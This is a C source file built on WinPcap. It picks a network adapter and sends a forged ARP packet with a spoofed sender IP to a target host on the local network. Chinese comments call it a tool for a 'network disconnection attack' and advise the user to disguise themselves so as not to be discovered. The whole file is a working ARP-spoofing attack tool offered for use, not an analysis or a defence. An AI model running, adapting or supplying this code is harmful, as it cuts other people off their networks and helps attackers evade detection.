#include <stdlib.h>
#include <stdio.h>

#include <pcap.h>


int main(int argc, char **argv)
{
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[60];
    int j;
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int inum;
    int i = 0;




    /* 检查命令行参数的合法性 */
    if (argc != 2)
    {
        printf("格式非法\n", argv[0]);
        return 0;
    }

    /* 获取本机设备列表 */
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }

    /* 打印列表 */
    for(d=alldevs; d; d=d->next)
    {
        printf("%d. %s", ++i, d->name);
        if (d->description)
            printf(" (%s)\n ", d->description);
        else
            printf(" 暂无可用描述\n");
    }

    if(i==0)
    {
        printf("\n没有发现任何设备，请先安装WinPcap\n");
        return -1;
    }

    printf("输入设备接口号 (1-%d):", i);
    scanf_s("%d", &inum);

    if(inum < 1 || inum > i)
    {
        printf("\n 非法的设备接口号 \n");
        /* 释放设备列表 */
        pcap_freealldevs(alldevs);//一定要记得释放
        return -1;
    }

    /* 跳转到选中的适配器 */
    for(d=alldevs, i=0; i<inum-1 ;d=d->next, i++);

    /* 打开设备 */
    if ( (fp= pcap_open(d->name,          // 设备名
                        65536,            // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
						PCAP_OPENFLAG_PROMISCUOUS,// 混杂模式
                        1000,             // 读取超时时间
                        NULL,             // 远程机器验证
                        errbuf )          // 错误缓冲池
                        ) == NULL)
    {
        fprintf(stderr,"\n无法打开适配器。WinPcap不支持设备%s\n", d->name);
        /* 释放设备列表 */
        pcap_freealldevs(alldevs);
        return -1;
    }
    
    printf("\n监听 %s...\n", d->description);
    
    /* 释放设备列表 */
    pcap_freealldevs(alldevs);

    /* 下面设置可以个性化去修改，断网攻击时候记得伪装好自己，以免被发现 */
    /* 设置MAC的目的地址为 ff:ff:ff:ff:ff:ff */
    packet[0]=0xff;
    packet[1]=0xff;
    packet[2]=0xff;
    packet[3]=0xff;
    packet[4]=0xff;
    packet[5]=0xff;
    
    /* 设置MAC源地址为 f4:6d:04:f9:70:4e */
    packet[6]=0xf4;
    packet[7]=0x6d;
    packet[8]=0x04;
    packet[9]=0xf9;
    packet[10]=0x70;
    packet[11]=0x4e;
   //帧类型 
    packet[12]=0x08;
    packet[13]=0x06;
   //硬件类型
    packet[14]=0x00;
    packet[15]=0x01;
	//协议类型
    packet[16]=0x08;
    packet[17]=0x00;
	//硬件地址长度
    packet[18]=0x06;
	//协议地址长度
    packet[19]=0x04;
	//操作码，1表示请求
    packet[20]=0x00;
    packet[21]=0x01;
	//源MAC地址me
    packet[22]=0xf4;
    packet[23]=0x6d;
    packet[24]=0x04;
    packet[25]=0xf9;
    packet[26]=0x70;
    packet[27]=0x4e;
	//伪装的源IP地址（115.155.39.156）
    packet[28]=0x73;
    packet[29]=0x9b;
    packet[30]=0x27;
    packet[31]=0x9c;
	//目的MAC，为全0
    packet[32]=0x00;
    packet[33]=0x00;
    packet[34]=0x00;
    packet[35]=0x00;
    packet[36]=0x00;
    packet[37]=0x00;
	//目的IP（115.155.39.190）
    packet[38]=0x73;
    packet[39]=0x9b;
    packet[40]=0x27;
    packet[41]=0xbe;
    /* 填充剩下的内容 */
    for(j=42;j<60;j++)
    {
        packet[j]=j%256;
    }

    /* 发送数据包 */
    if (pcap_sendpacket(fp, packet, 60 /* size */) != 0)
    {
        fprintf(stderr,"\n发送失败 \n", pcap_geterr(fp));
        return -1;
    }

    return 0;
}

